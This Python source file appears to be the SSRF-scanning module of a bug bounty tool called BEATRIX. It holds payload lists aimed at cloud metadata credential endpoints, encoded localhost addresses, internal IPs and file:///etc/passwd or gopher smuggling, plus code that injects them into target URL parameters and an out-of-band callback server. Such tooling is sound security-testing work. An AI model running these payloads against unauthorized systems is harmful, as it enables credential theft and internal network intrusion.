"""
BEATRIX SSRF Scanner

Server-Side Request Forgery Detection
OWASP A10:2025 - Server-Side Request Forgery

SSRF is a GOLDMINE for bug bounties:
- $10k-$100k+ on major programs
- Often leads to internal network access
- Can escalate to RCE via cloud metadata

Detection Strategies:
1. Out-of-band (OOB) detection with callback servers
2. Timing differences for internal vs external hosts
3. Error message analysis
4. Response content differences
"""
from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Any, AsyncIterator, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

if TYPE_CHECKING:
    import httpx
else:
    try:
        import httpx
    except ImportError:
        httpx = None

from beatrix.core.types import Confidence, Finding, Severity

from .base import BaseScanner, ScanContext


@dataclass
class SSRFCandidate:
    """Tracks potential SSRF injection points"""
    url: str
    param_name: str
    param_type: str  # query, body, header, path
    original_value: str
    evidence: Dict[str, Any] = field(default_factory=dict)


@dataclass
class SSRFPayload:
    """SSRF test payload"""
    name: str
    value: str
    target_type: str  # internal, cloud, localhost, protocol
    severity: Severity
    description: str


class SSRFScanner(BaseScanner):
    """
    SSRF vulnerability scanner.

    Tests for Server-Side Request Forgery using:
    - Localhost/internal IP access
    - Cloud metadata endpoints (AWS, GCP, Azure)
    - Protocol smuggling (file://, gopher://)
    - DNS rebinding indicators
    - Timing-based detection
    """

    name = "ssrf"
    description = "Server-Side Request Forgery scanner"
    version = "1.0.0"
    owasp_category = "A10:2025"

    # Parameters commonly vulnerable to SSRF
    SSRF_PARAM_PATTERNS = [
        r'url', r'uri', r'link', r'href', r'src',
        r'dest', r'redirect', r'target', r'path',
        r'site', r'html', r'page', r'feed', r'host',
        r'domain', r'callback', r'return', r'next',
        r'data', r'reference', r'file', r'load',
        r'to', r'open', r'val', r'continue', r'window',
        r'image', r'img', r'icon', r'logo', r'resource',
        r'proxy', r'fetch', r'request', r'download',
        r'content', r'document', r'origin', r'api',
    ]

    def __init__(self, config: Optional[Dict] = None):
        super().__init__(config)
        self.config = config or {}
        self.timeout = self.config.get('timeout', 10)
        self.callback_server = self.config.get('callback_server', None)
        self.payloads = self._build_payloads()

    def _build_payloads(self) -> List[SSRFPayload]:
        """Build SSRF test payloads"""
        payloads = []

        # Localhost bypass variations
        localhost_payloads = [
            ("localhost", "http://localhost/"),
            ("localhost_port", "http://localhost:80/"),
            ("127.0.0.1", "http://127.0.0.1/"),
            ("127.0.0.1_port", "http://127.0.0.1:80/"),
            ("0.0.0.0", "http://0.0.0.0/"),
            ("127.1", "http://127.1/"),  # Short form
            ("127.0.1", "http://127.0.1/"),
            ("2130706433", "http://2130706433/"),  # Decimal IP
            ("017700000001", "http://017700000001/"),  # Octal
            ("0x7f000001", "http://0x7f000001/"),  # Hex
            ("localtest.me", "http://localtest.me/"),  # DNS that resolves to 127.0.0.1
            ("spoofed.oast.live", "http://spoofed.oast.live/"),
            ("[::]", "http://[::]/"),  # IPv6 localhost
            ("[::1]", "http://[::1]/"),  # IPv6 loopback
            ("0", "http://0/"),
            ("127.127.127.127", "http://127.127.127.127/"),
        ]

        for name, value in localhost_payloads:
            payloads.append(SSRFPayload(
                name=f"localhost_{name}",
                value=value,
                target_type="localhost",
                severity=Severity.HIGH,
                description=f"Localhost access via {name}"
            ))

        # Cloud metadata endpoints (CRITICAL - can lead to full account takeover)
        cloud_payloads = [
            # AWS IMDSv1 (if IMDSv2 not enforced)
            ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
            ("aws_metadata_iam", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
            ("aws_user_data", "http://169.254.169.254/latest/user-data/"),
            ("aws_token", "http://169.254.169.254/latest/api/token"),

            # AWS alternate IPs
            ("aws_alt1", "http://instance-data/latest/meta-data/"),
            ("aws_decimal", "http://2852039166/latest/meta-data/"),  # 169.254.169.254 in decimal

            # GCP metadata
            ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
            ("gcp_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
            ("gcp_alt", "http://169.254.169.254/computeMetadata/v1/"),

            # Azure metadata
            ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
            ("azure_identity", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"),

            # DigitalOcean
            ("do_metadata", "http://169.254.169.254/metadata/v1/"),

            # Oracle Cloud
            ("oracle_metadata", "http://169.254.169.254/opc/v1/instance/"),

            # Alibaba Cloud
            ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/"),

            # Kubernetes
            ("k8s_api", "https://kubernetes.default.svc/"),
            ("k8s_env", "http://169.254.169.254/"),
        ]

        for name, value in cloud_payloads:
            payloads.append(SSRFPayload(
                name=f"cloud_{name}",
                value=value,
                target_type="cloud",
                severity=Severity.CRITICAL,
                description=f"Cloud metadata access: {name}"
            ))

        # Internal network scanning
        internal_payloads = [
            ("internal_10", "http://10.0.0.1/"),
            ("internal_172", "http://172.16.0.1/"),
            ("internal_192", "http://192.168.0.1/"),
            ("internal_192_1", "http://192.168.1.1/"),
        ]

        for name, value in internal_payloads:
            payloads.append(SSRFPayload(
                name=name,
                value=value,
                target_type="internal",
                severity=Severity.HIGH,
                description=f"Internal network access: {value}"
            ))

        # Protocol smuggling
        protocol_payloads = [
            ("file_etc_passwd", "file:///etc/passwd"),
            ("file_etc_hosts", "file:///etc/hosts"),
            ("file_win_hosts", "file:///c:/windows/system32/drivers/etc/hosts"),
            ("gopher", "gopher://localhost:25/"),
            ("dict", "dict://localhost:11211/stat"),
            ("ftp", "ftp://localhost/"),
            ("ldap", "ldap://localhost/"),
            ("tftp", "tftp://localhost/"),
        ]

        for name, value in protocol_payloads:
            payloads.append(SSRFPayload(
                name=f"protocol_{name}",
                value=value,
                target_type="protocol",
                severity=Severity.CRITICAL,
                description=f"Protocol smuggling: {name}"
            ))

        return payloads

    def _is_ssrf_param(self, param_name: str) -> bool:
        """Check if parameter name suggests SSRF vulnerability"""
        param_lower = param_name.lower()
        for pattern in self.SSRF_PARAM_PATTERNS:
            if re.search(pattern, param_lower, re.IGNORECASE):
                return True
        return False

    def _inject_oob_payloads(self, poc_server, target_url: str) -> None:
        """
        Add OOB callback payloads using the local PoC server.

        These payloads point to our own HTTP server, so if the target
        makes the request, we get an instant confirmed callback.
        """
        import secrets as _secrets

        oob_payloads = [
            ("oob_http", "ssrf", "OOB HTTP callback"),
            ("oob_https", "ssrf", "OOB HTTPS callback"),
        ]

        for name, vuln_type, desc in oob_payloads:
            uid = _secrets.token_hex(6)
            cb_url = poc_server.oob_url(
                vuln_type=vuln_type,
                uid=uid,
                target_url=target_url,
                parameter="url",
            )

            self.payloads.append(SSRFPayload(
                name=f"oob_{name}_{uid}",
                value=cb_url,
                target_type="localhost",
                severity=Severity.HIGH,
                description=f"{desc} → {cb_url}",
            ))

        self.log(f"Injected {len(oob_payloads)} OOB callback payloads from PoC server")

    def find_ssrf_candidates(self, url: str, body: Optional[Any] = None) -> List[SSRFCandidate]:
        """Identify potential SSRF injection points"""
        candidates = []
        parsed = urlparse(url)

        # Check query parameters
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name, values in params.items():
                if self._is_ssrf_param(param_name):
                    for value in values:
                        # Also check if value looks like a URL
                        if value.startswith(('http://', 'https://', '//', 'ftp://')):
                            candidates.append(SSRFCandidate(
                                url=url,
                                param_name=param_name,
                                param_type="query",
                                original_value=value,
                                evidence={"reason": "URL-like value in URL parameter"}
                            ))
                        elif self._is_ssrf_param(param_name):
                            candidates.append(SSRFCandidate(
                                url=url,
                                param_name=param_name,
                                param_type="query",
                                original_value=value,
                                evidence={"reason": "Suspicious parameter name"}
                            ))

        # Check body parameters
        if body:
            for param_name, value in self._flatten_dict(body):
                if self._is_ssrf_param(param_name):
                    candidates.append(SSRFCandidate(
                        url=url,
                        param_name=param_name,
                        param_type="body",
                        original_value=str(value),
                        evidence={"reason": "Suspicious body parameter"}
                    ))
                elif isinstance(value, str) and value.startswith(('http://', 'https://')):
                    candidates.append(SSRFCandidate(
                        url=url,
                        param_name=param_name,
                        param_type="body",
                        original_value=value,
                        evidence={"reason": "URL value in body"}
                    ))

        return candidates

    def _flatten_dict(self, d: Any, parent_key: str = '') -> List[Tuple[str, Any]]:
        """Flatten nested dict/list for parameter analysis"""
        items = []

        if isinstance(d, list):
            for i, v in enumerate(d):
                new_key = f"{parent_key}[{i}]"
                if isinstance(v, (dict, list)):
                    items.extend(self._flatten_dict(v, new_key))
                else:
                    items.append((new_key, v))
            return items

        if isinstance(d, dict):
            for k, v in d.items():
                new_key = f"{parent_key}.{k}" if parent_key else k
                if isinstance(v, (dict, list)):
                    items.extend(self._flatten_dict(v, new_key))
                else:
                    items.append((new_key, v))
            return items

        return []

    async def test_ssrf(self,
                        candidate: SSRFCandidate,
                        headers: Optional[Dict[str, str]] = None) -> List[Finding]:
        """Test a candidate for SSRF vulnerability"""
        findings = []
        headers = headers or {}

        # Use BaseScanner's rate-limited client when available (inside scan()),
        # fall back to a standalone client for direct calls.
        client = self.client
        own_client = False
        if client is None:
            client = httpx.AsyncClient(
                timeout=self.timeout,
                follow_redirects=False,
                verify=False
            )
            own_client = True

        try:
            # Get baseline response
            try:
                baseline = await client.get(candidate.url, headers=headers)
                baseline_time = baseline.elapsed.total_seconds()
                baseline_size = len(baseline.content)
            except Exception:
                baseline_time = 0
                baseline_size = 0

            for payload in self.payloads:
                finding = await self._test_payload(
                    client, candidate, payload, headers,
                    baseline_time, baseline_size
                )
                if finding:
                    findings.append(finding)

                    # If we find cloud metadata access, this is CRITICAL
                    if payload.target_type == "cloud":
                        break  # One critical finding is enough
        finally:
            if own_client:
                await client.aclose()

        return findings

    async def _test_payload(self,
                           client: httpx.AsyncClient,
                           candidate: SSRFCandidate,
                           payload: SSRFPayload,
                           headers: Dict[str, str],
                           baseline_time: float,
                           baseline_size: int) -> Optional[Finding]:
        """Test a single SSRF payload"""

        # Build test URL
        if candidate.param_type == "query":
            parsed = urlparse(candidate.url)
            params = parse_qs(parsed.query)
            params[candidate.param_name] = [payload.value]
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
        else:
            test_url = candidate.url

        try:
            start = time.time()

            if candidate.param_type == "body":
                response = await client.post(
                    candidate.url,
                    json={candidate.param_name: payload.value},
                    headers=headers
                )
            else:
                response = await client.get(test_url, headers=headers)

            elapsed = time.time() - start

            # Analyze response for SSRF indicators
            indicators = self._analyze_ssrf_response(
                response, payload, elapsed, baseline_time, baseline_size
            )

            if indicators:
                finding = self.create_finding(
                    title=f"Potential SSRF: {payload.description}",
                    description=self._build_ssrf_description(
                        candidate, payload, indicators, response
                    ),
                    severity=payload.severity,
                    confidence=self._calculate_confidence(indicators),
                    url=test_url,
                    evidence={
                        "param": candidate.param_name,
                        "payload": payload.value,
                        "indicators": indicators,
                        "response_code": response.status_code,
                        "response_size": len(response.content),
                    },
                    remediation="Implement allowlist of permitted URLs/hosts. "
                               "Block requests to internal IPs and cloud metadata. "
                               "Use DNS resolution checks to prevent rebinding."
                )
                finding.reproduction_steps = [
                    f"1. Send request to: {test_url}",
                    f"2. Parameter '{candidate.param_name}' contains SSRF payload",
                    f"3. Payload used: {payload.value}",
                    f"4. Indicators found: {', '.join(indicators)}",
                ]
                return finding

        except httpx.TimeoutException:
            # Timeout could indicate internal network access
            if payload.target_type in ["internal", "localhost"]:
                return self.create_finding(
                    title=f"Potential SSRF (Timeout): {payload.description}",
                    description=f"Request to internal target timed out, which may indicate "
                               f"the server is attempting to connect to {payload.value}",
                    severity=Severity.MEDIUM,
                    confidence=Confidence.LOW,
                    url=test_url,
                    evidence={
                        "param": candidate.param_name,
                        "payload": payload.value,
                        "reason": "timeout",
                    }
                )
        except Exception:
            pass

        return None

    def _analyze_ssrf_response(self,
                               response: httpx.Response,
                               payload: SSRFPayload,
                               elapsed: float,
                               baseline_time: float,
                               baseline_size: int) -> List[str]:
        """Analyze response for SSRF success indicators.

        Returns indicators only when there's STRONG evidence of SSRF,
        not just timing/size deltas which are unreliable noise.

        CRITICAL: We must strip the payload URL itself from the response
        before checking for indicator patterns. SPAs (React, Next.js,
        Angular) serialize the full request URL — including injected
        params — into client-side hydration state. Matching our own
        payload string is NOT evidence of SSRF.
        """
        strong_indicators = []
        weak_indicators = []
        content = response.text.lower()

        # Strip our own payload from the response to avoid self-matching.
        # SPAs echo "?next=http://169.254.169.254/..." in __PWS_DATA__,
        # canonical URLs, router state, etc.
        payload_lower = payload.value.lower()
        content = content.replace(payload_lower, '')
        # Also strip URL-encoded version
        from urllib.parse import quote
        content = content.replace(quote(payload.value, safe='').lower(), '')
        content = content.replace(quote(payload.value, safe='/:%@').lower(), '')

        # Check for cloud metadata patterns (STRONG)
        if payload.target_type == "cloud":
            cloud_patterns = [
                r'ami-[a-z0-9]{8,}',  # AWS AMI ID (tighter: 8+ chars)
                r'"accessKeyId"\s*:',
                r'"secretAccessKey"\s*:',
                r'instance-identity',
                r'security-credentials',
                r'computeMetadata',
                r'metadata/instance',
            ]
            for pattern in cloud_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    strong_indicators.append(f"cloud_metadata_pattern: {pattern}")

        # Check for internal server signatures (MODERATE — only meaningful ones)
        internal_patterns = [
            (r'phpinfo\(\)', 'phpinfo'),
            (r'root:.*:0:0:', 'etc_passwd_in_page'),
        ]

        for pattern, name in internal_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                strong_indicators.append(f"internal_indicator: {name}")

        # Check for local file content (STRONG)
        if payload.target_type == "protocol":
            file_patterns = [
                (r'root:.*:0:0:', 'etc_passwd'),
                (r'\[localhost\]', 'windows_hosts'),
            ]
            for pattern, name in file_patterns:
                if re.search(pattern, content):
                    strong_indicators.append(f"file_content: {name}")

        # Timing analysis (WEAK — only supplement, not standalone)
        if baseline_time > 0:
            time_diff = abs(elapsed - baseline_time)
            if time_diff > 5:  # Raised threshold: 5s+ difference
                weak_indicators.append(f"timing_difference: {time_diff:.2f}s")

        # Response size difference (WEAK — not standalone)
        if baseline_size > 0:
            size_diff = abs(len(response.content) - baseline_size)
            if size_diff > baseline_size * 0.5 and size_diff > 500:
                weak_indicators.append(f"size_difference: {size_diff} bytes")

        # Status code analysis (WEAK — not standalone)
        if response.status_code in [500, 502, 503]:
            weak_indicators.append(f"error_status: {response.status_code}")

        # Only return indicators if we have at least one STRONG indicator,
        # or multiple weak indicators combined (3+)
        if strong_indicators:
            return strong_indicators + weak_indicators
        elif len(weak_indicators) >= 3:
            return weak_indicators

        return []

    def _calculate_confidence(self, indicators: List[str]) -> Confidence:
        """Calculate confidence based on indicators"""
        strong_count = sum(1 for i in indicators
                          if 'cloud_metadata' in i or 'file_content' in i
                          or 'internal_indicator' in i)
        if strong_count >= 2:
            return Confidence.CERTAIN
        if strong_count == 1:
            return Confidence.FIRM
        if len(indicators) >= 3:
            return Confidence.TENTATIVE
        return Confidence.LOW

    def _build_ssrf_description(self,
                                candidate: SSRFCandidate,
                                payload: SSRFPayload,
                                indicators: List[str],
                                response: httpx.Response) -> str:
        """Build detailed SSRF finding description"""
        desc = f"""
## Server-Side Request Forgery (SSRF)

**Vulnerable Parameter:** `{candidate.param_name}`
**Payload Type:** {payload.target_type}
**Payload:** `{payload.value}`

### Impact
{self._get_impact_description(payload.target_type)}

### Indicators Found
"""
        for indicator in indicators:
            desc += f"- {indicator}\n"

        desc += f"""
### Response Details
- Status Code: {response.status_code}
- Response Size: {len(response.content)} bytes
- Content-Type: {response.headers.get('content-type', 'N/A')}
"""

        # Add response snippet if it contains interesting data
        if any('cloud_metadata' in i or 'file_content' in i for i in indicators):
            desc += f"""
### Response Snippet
```
{response.text[:1000]}
```
"""

        return desc

    def _get_impact_description(self, target_type: str) -> str:
        """Get impact description by target type"""
        impacts = {
            "cloud": """
**CRITICAL**: Cloud metadata access can expose:
- AWS IAM credentials → Full AWS account access
- GCP service account tokens → Full GCP access
- Azure managed identity tokens → Full Azure access
- Instance metadata, SSH keys, startup scripts
""",
            "localhost": """
**HIGH**: Localhost access can enable:
- Access to internal services (databases, caches, admin panels)
- Bypass of firewall and network segmentation
- Port scanning of internal network
- Potential RCE via internal services
""",
            "internal": """
**HIGH**: Internal network access can enable:
- Scanning of internal infrastructure
- Access to internal APIs and services
- Lateral movement within the network
- Data exfiltration from internal systems
""",
            "protocol": """
**CRITICAL**: Protocol smuggling can enable:
- Local file read (file://)
- Gopher-based exploitation (Redis, Memcached)
- LDAP injection
- Potential RCE via protocol handlers
"""
        }
        return impacts.get(target_type, "Unknown impact")

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        """Main scan method"""
        self.log(f"Starting SSRF scan on {ctx.url}")
        findings = []

        # Inject OOB callback payloads if the PoC server is running
        poc_server = ctx.extra.get("poc_server") if ctx.extra else None
        if poc_server and poc_server.is_running:
            self._inject_oob_payloads(poc_server, ctx.url)

        # Find SSRF candidates
        body = None
        if ctx.request and ctx.request.body:
            try:
                import json
                raw = ctx.request.body
                if isinstance(raw, bytes):
                    raw = raw.decode('utf-8', errors='replace')
                if isinstance(raw, str):
                    body = json.loads(raw)
            except (json.JSONDecodeError, TypeError, ValueError):
                pass

        candidates = self.find_ssrf_candidates(ctx.url, body)

        # Only inject blind params if the URL already has query parameters,
        # suggesting it accepts dynamic input. Don't blindly inject params
        # into a bare URL — that generates noise.
            # If still no candidates on a bare URL, skip — don't inject random params

        if not candidates:
            self.log("No SSRF candidates found, skipping")
            return

        self.log(f"Testing {len(candidates)} SSRF candidates")
        for candidate in candidates:
            candidate_findings = await self.test_ssrf(candidate, ctx.headers)
            findings.extend(candidate_findings)

        for finding in findings:
            yield finding

    async def quick_scan(self, url: str, headers: Optional[Dict[str, str]] = None) -> List[Finding]:
        """Quick SSRF scan on a URL"""
        # Find candidates
        candidates = self.find_ssrf_candidates(url)

        if not candidates:
            # Generate candidates from URL parameters
            parsed = urlparse(url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param_name, values in params.items():
                    candidates.append(SSRFCandidate(
                        url=url,
                        param_name=param_name,
                        param_type="query",
                        original_value=values[0] if values else ""
                    ))

        all_findings = []
        for candidate in candidates:
            findings = await self.test_ssrf(candidate, headers)
            all_findings.extend(findings)

        return all_findings


class SSRFCallbackServer:
    """
    Simple callback server for out-of-band SSRF detection.

    Use with ngrok or similar for external testing:
    1. Run this server locally
    2. Use ngrok to expose it
    3. Use the ngrok URL as callback in SSRF payloads
    4. Check for incoming connections
    """

    def __init__(self, host: str = "0.0.0.0", port: int = 8888):
        self.host = host
        self.port = port
        self.callbacks = []

    async def handle_connection(self, reader, writer):
        """Handle incoming callback connection"""
        addr = writer.get_extra_info('peername')
        data = await reader.read(1024)

        callback_info = {
            "timestamp": time.time(),
            "source_ip": addr[0],
            "source_port": addr[1],
            "data": data.decode('utf-8', errors='replace'),
        }

        self.callbacks.append(callback_info)
        print(f"[CALLBACK] Connection from {addr[0]}:{addr[1]}")
        print(f"[CALLBACK] Data: {data[:200]}")

        # Send response
        response = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK"
        writer.write(response)
        await writer.drain()
        writer.close()

    async def start(self):
        """Start the callback server"""
        server = await asyncio.start_server(
            self.handle_connection, self.host, self.port
        )
        print(f"[CALLBACK SERVER] Listening on {self.host}:{self.port}")
        async with server:
            await server.serve_forever()


# Convenience function for quick testing
async def test_ssrf(url: str, headers: Optional[Dict[str, str]] = None) -> List[Finding]:
    """Quick SSRF test on a URL"""
    scanner = SSRFScanner()
    return await scanner.quick_scan(url, headers)
